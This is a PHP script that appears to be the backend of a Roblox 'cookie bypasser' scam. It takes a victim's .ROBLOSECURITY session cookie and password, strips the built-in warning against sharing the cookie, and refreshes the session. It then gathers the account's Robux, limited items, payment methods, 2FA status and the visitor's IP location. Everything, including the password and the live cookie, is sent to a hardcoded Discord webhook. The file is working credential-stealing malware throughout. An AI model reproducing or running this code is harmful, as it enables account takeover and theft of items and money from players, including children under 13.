<?php

// Function to get X-CSRF token
function getXCSRFToken($cookie) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://auth.roblox.com/v2/logout',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            'Cookie: .ROBLOSECURITY=' . $cookie
        ],
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (preg_match('/X-CSRF-Token:\s*(.+)/i', $response, $matches)) {
        return trim($matches[1]);
    }
    
    return null;
}

function getAuthenticationTicket($cookie, $xcsrfToken) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://auth.roblox.com/v1/authentication-ticket',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            'Cookie: .ROBLOSECURITY=' . $cookie,
            'X-CSRF-Token: ' . $xcsrfToken,
            'RBXauthenticationNegotiation: 1',
            'Referer: https://www.roblox.com/hewhewhew'
        ],
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (preg_match('/rbx-authentication-ticket:\s*(.+)/i', $response, $matches)) {
        return trim($matches[1]);
    }
    
    return null;
}

function redeemTicket($ticket) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://auth.roblox.com/v1/authentication-ticket/redeem',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            'RBXauthenticationNegotiation: 1',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS => json_encode(['authenticationTicket' => $ticket]),
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (preg_match('/\.ROBLOSECURITY=([^;]+)/', $response, $matches)) {
        return $matches[1];
    }
    
    return null;
}

function refresh($cookie) {
    $xcsrfToken = getXCSRFToken($cookie);
    if (!$xcsrfToken) {
        return null;
    }
    
    $ticket = getAuthenticationTicket($cookie, $xcsrfToken);
    if (!$ticket) {
        return null;
    }
    
    $newCookie = redeemTicket($ticket);
    if (!$newCookie) {
        return null;
    }
    
    return $newCookie;
}

// Function to make HTTP requests for user info
function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to send Discord webhook
function sendWebhook($webhookUrl, $data) {
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to clean cookie (remove ALL warning prefixes)
function cleanCookie($cookie) {
    $warningPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    
    // Remove ALL instances of the warning prefix
    while (strpos($cookie, $warningPrefix) !== false) {
        $cookie = str_replace($warningPrefix, '', $cookie);
    }
    
    return trim($cookie);
}

// Main execution
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $password = $_GET['password'] ?? 'No password provided'; // Get password
    
    // Clean the cookie (remove ALL warning prefixes)
    $cleanCookie = cleanCookie($cookie);
    
    if (empty($cleanCookie)) {
        echo "Invalid Cookie";
        exit;
    }
    
    // Refresh the cookie
    $refreshed = refresh($cleanCookie);
    
    if ($refreshed) {
        // Build clean cookie (without warning prefix)
        $cleanRefreshedCookie = cleanCookie($refreshed);
        
        // Build full cookie with SINGLE warning prefix
        $warningPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
        $fullCookie = $warningPrefix . $cleanRefreshedCookie;
        
        $headers = ["Cookie: .ROBLOSECURITY=$cleanRefreshedCookie", "Content-Type: application/json"];
        
        // Get user settings
        $settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
        
        if ($settingsData) {
            $userId = $settingsData['UserId'] ?? 0;
            $age = $settingsData['AccountAgeInDays'] ?? 0;
            $email = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? 'Verified' : 'Unverified') : 'No Email';
            $twofactorauth = 'False';
            if (isset($settingsData['MyAccountSecurityModel']['IsTwoStepEnabled'])) {
                $twofactorauth = $settingsData['MyAccountSecurityModel']['IsTwoStepEnabled'] ? 'True' : 'False';
            }
            
            // Get age verification for voice chat
            $ageVerification = json_decode(makeRequest("https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age", $headers), true);
            $voiceChat = isset($ageVerification['isVerified']) && $ageVerification['isVerified'] ? 'True' : 'False';
            
            // Get premium status
            $premium = isset($settingsData['IsPremium']) && $settingsData['IsPremium'] ? 'True' : 'False';
            if ($premium === 'True') {
                $subDetails = json_decode(makeRequest("https://premiumfeatures.roblox.com/v1/users/{$userId}/subscriptions/details", $headers), true);
                if (isset($subDetails['subscriptionProductModel']['robuxStipendAmount'])) {
                    $premiumStipend = $subDetails['subscriptionProductModel']['robuxStipendAmount'];
                    $premium = "True (<:greyrobux:1362423420738080938> {$premiumStipend})";
                }
            }
            
            // Get thumbnail
            $thumbnail = json_decode(makeRequest("https://thumbnails.roblox.com/v1/users/avatar-headshot?size=420x420&format=png&userIds={$userId}", $headers), true);
            $robux = json_decode(makeRequest("https://economy.roblox.com/v1/users/{$userId}/currency", $headers), true);
            $robuxpend = json_decode(makeRequest("https://economy.roblox.com/v2/users/{$userId}/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
            $groups = json_decode(makeRequest("https://groups.roblox.com/v1/users/{$userId}/groups/roles", $headers), true);
            $bundles = json_decode(makeRequest("https://catalog.roblox.com/v1/users/{$userId}/bundles?limit=500", $headers), true);
            $limiteds = json_decode(makeRequest("https://inventory.roblox.com/v1/users/{$userId}/assets/collectibles?limit=100", $headers), true);
            $payment = json_decode(makeRequest("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $headers), true);
            $bal = json_decode(makeRequest("https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation", $headers), true);
            $summary = json_decode(makeRequest("https://economy.roblox.com/v2/users/{$userId}/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
            $gamevisits = json_decode(makeRequest("https://games.roblox.com/v2/users/{$userId}/games?accessFilter=Public&limit=50", $headers), true);
            $dev = json_decode(makeRequest("https://catalog.roblox.com/v1/catalog/items/5731050224/details?itemType=Asset", $headers), true);
            $violetvalkrie = json_decode(makeRequest("https://catalog.roblox.com/v1/catalog/items/1402432199/details?itemType=Asset", $headers), true);
            
            $itemv1 = isset($dev['owned']) && $dev['owned'] === true ? "Yes" : "No";
            $itemv2 = isset($violetvalkrie['owned']) && $violetvalkrie['owned'] === true ? "True" : "False";
            
            // Get IP information
            $ipAddress = $_SERVER['REMOTE_ADDR'];
            $ipinfo = @file_get_contents("http://ip-api.com/json/$ipAddress");
            $ipjson = json_decode($ipinfo, true);
            $countryCode = strtolower($ipjson['countryCode'] ?? 'us');
            $flagEmoji = ":flag_$countryCode:";
            $country = $ipjson['country'] ?? 'Unknown';
            $region = $ipjson['regionName'] ?? 'Unknown';
            $city = $ipjson['city'] ?? 'Unknown';
            $isp = $ipjson['isp'] ?? 'Unknown';
            
            // Format IP info for description
            $ipInfoText = "**$flagEmoji $country ($countryCode) | $region, $city**\n**ISP:** $isp";
            
            // Build games field value
            $games = [
                ['icon' => '<:mm2:1349119069714124934>', 'name' => 'MM2', 'id' => 66654135],
                ['icon' => '<:adm:1348704414910644234>', 'name' => 'ADM', 'id' => 383310974],
                ['icon' => '<:ps99:1348704835196682301>', 'name' => 'PS99', 'id' => 3317771874],
                ['icon' => '<:bladeball:1307351511109730384>', 'name' => 'BB', 'id' => 4777817887],
                ['icon' => '<:gag:1382410347868065802>', 'name' => 'GAG', 'id' => 7436755782]
            ];
            
            $gamesValue = '';
            foreach ($games as $game) {
                $gamesValue .= "{$game['icon']} **{$game['name']}:** True | **__0__**\n";
            }
            
            $visits = 0;
            foreach ($gamevisits['data'] ?? [] as $g) {
                $visits += $g['placeVisits'] ?? 0;
            }
            
            $specials = count($limiteds['data'] ?? []);
            $rap = 0;
            foreach ($limiteds['data'] ?? [] as $item) {
                $rap += $item['recentAveragePrice'] ?? 0;
            }
            
            $krblx = false;
            $head = false;
            foreach ($bundles['data'] ?? [] as $bundle) {
                if ($bundle['id'] == 192) $krblx = true;
                if ($bundle['id'] == 5731050224) $head = true;
            }
            
            $groupowned = [];
            $comoney = 0;
            $mems = 0;
            
            foreach ($groups['data'] ?? [] as $group) {
                if ($group['role']['rank'] === 255) {
                    $idv2 = $group['group']['id'];
                    $groupowned[] = $group['group']['name'];
                    
                    $ginfo = json_decode(makeRequest("https://economy.roblox.com/v1/groups/{$idv2}/currency", $headers), true);
                    $comoney += $ginfo['robux'] ?? 0;
                    
                    $group_details = json_decode(makeRequest("https://groups.roblox.com/v1/groups/{$idv2}", $headers), true);
                    $mems += $group_details['memberCount'] ?? 0;
                }
            }
            
            $pcount = is_array($payment) ? count($payment) : 0;
            $pstatus = $pcount > 0 ? 'True (' . $pcount . ')' : 'False';
            $avatar = isset($thumbnail['data'][0]['imageUrl']) && !empty($thumbnail['data'][0]['imageUrl']) ? $thumbnail['data'][0]['imageUrl'] : 'https://www.hypnobirthing.co.il/img/noavatar.png';
            
            $livaydeath = $robuxpend['pendingRobuxTotal'] ?? 0;
            $robuxBalance = $robux['robux'] ?? 0;
            $summaryTotal = abs($summary['outgoingRobuxTotal'] ?? 0);
            $creditBalance = $bal['creditBalance'] ?? 0;
            $currencyCode = !empty($bal['currencyCode']) ? $bal['currencyCode'] : "Unknown";
            
            // Get user name
            $userName = $settingsData['Name'] ?? 'Unknown';
            
            // Build user info embed WITH PASSWORD
            $embedData = [
                'content' => '@here Cookie bypassed  Successful!',
                'username' => 'HAR - HIT',
                'embeds' => [
                    [
                        'title' => '<:dc:1362119171693084812> ```Discord Notification```',
                        'description' => "### <:rolimonsblack:978565365338603562>[**Rolimons Stats**](https://www.rolimons.com/player/$userId) ** | ** <:roblox:1349399578213875804>[**Roblox Profile**](https://www.roblox.com/users/$userId/profile)\n\n**Check IP :round_pushpin: | [$ipAddress](https://ipapi.co/$ipAddress/json)**\n\n$ipInfoText",
                        'color' => 7763060,
                        'author' => [
                            'name' => $userName . ' | ' . ($settingsData['UserAbove13'] ? '13+' : '<13'),
                            'icon_url' => $avatar
                        ],
                        'thumbnail' => [
                            'url' => $avatar
                        ],
                        'fields' => [
                            ['name' => '<:noFilter1:1362423392602689556> Username', 'value' => $userName, 'inline' => false],
                            ['name' => '<:stats:1362423461116641420> Account Stats', 'value' => "`Account Age: {$age} Days`\n`Games Developer: $itemv1`\n- `Game Visits: $visits`", 'inline' => false],
                            ['name' => '<:greyrobux:1362423420738080938> Robux', 'value' => "**Balance:** {$robuxBalance} <:gelbrobux:1362423430082724081>\n**Pending:** {$livaydeath} <:greyrobux:1362423420738080938>", 'inline' => true],
                            ['name' => '<:valkrie:1362423450563514488> Limiteds', 'value' => "**RAP:** {$rap} <:gelbrobux:1362423430082724081>\n**Limiteds:** {$specials} <:money_bag:1306638519778938890>", 'inline' => true],
                            ['name' => '<:chart:1306639123498664058> Summary', 'value' => "{$summaryTotal} <:gelbrobux:1362423430082724081>", 'inline' => true],
                            ['name' => '<:cc:1362423485900656821> Payments', 'value' => "<:pay:1362423496659042394> {$pstatus}\nCredit Balance: **{$creditBalance}** in **{$currencyCode}**", 'inline' => true],
                            ['name' => '<:games:1362423506339500152> Games', 'value' => $gamesValue, 'inline' => true],
                            ['name' => '<:Settings:1307353941780201535> Settings', 'value' => "<:email:1362423516309229692> **Email:** {$email}\n<:verify:1362423525679304975> **2FA:** {$twofactorauth}\n<:vc:1387508679124975706> **Voice Chat:** {$voiceChat}", 'inline' => true],
                            ['name' => '<:inventory:1362423558625820844> Inventory', 'value' => "<:KorbloxDeathspeaker:1362432257528168469> " . ($krblx ? 'True' : 'False') . "\n<:HeadlessHorseman:1362432343255679126> " . ($head ? 'True' : 'False') . "\n<:Violet_Valkyrie:1362432688044380321> " . $itemv2, 'inline' => true],
                            ['name' => '<:rbxPremium:1307354518089891974> Premium', 'value' => $premium, 'inline' => true],
                            ['name' => '<:community:1362423568578646016> Groups', 'value' => "**Owned:** " . count($groupowned) . "\n**Members:** {$mems}\n**Balance:** {$comoney} <:gelbrobux:1362423430082724081>", 'inline' => true],
                            ['name' => '<:lock:1362423578578646017> Password', 'value' => "||`$password`||", 'inline' => false]
                        ],
                        'footer' => [
                            'text' => 'Bypasser • ' . date('Y-m-d H:i:s'),
                            'icon_url' => 'https://cdn.discordapp.com/emojis/1327665139645939742.png'
                        ],
                        'timestamp' => date('c')
                    ],
                    [
                        'title' => '.ROBLOSECURITY',
                        'description' => "<:Cookie_Clicker:1362437801592754396> **Refreshed Cookie**\n```{$fullCookie}```",
                        'color' => 7763060,
                        'thumbnail' => [
                            'url' => 'https://res.cloudinary.com/di3jdc46c/image/upload/v1737844893/cookie_1_n3nluv.png'
                        ],
                        'footer' => [
                            'text' => 'Click to copy • Auto-refreshed',
                            'icon_url' => 'https://cdn.discordapp.com/emojis/1362437801592754396.png'
                        ]
                    ]
                ]
            ];
            
            // Discord webhook URL
            $webhookUrl = 'https://discord.com/api/webhooks/1446446063753105498/D2okCcVeUerDb7SI37UdTmKU_SgH23KJq2lhJ2oiHks1uXKjCU-8ydVDQHYRujIGccGy';
            
            // Send embeds to Discord webhook
            sendWebhook($webhookUrl, $embedData);
        }
        
        // Output the clean refreshed cookie (without warning prefix) for the frontend
        echo $cleanRefreshedCookie;
    } else {
        echo "Invalid Cookie";
    }
} else {
    echo "No cookie provided";
}
?>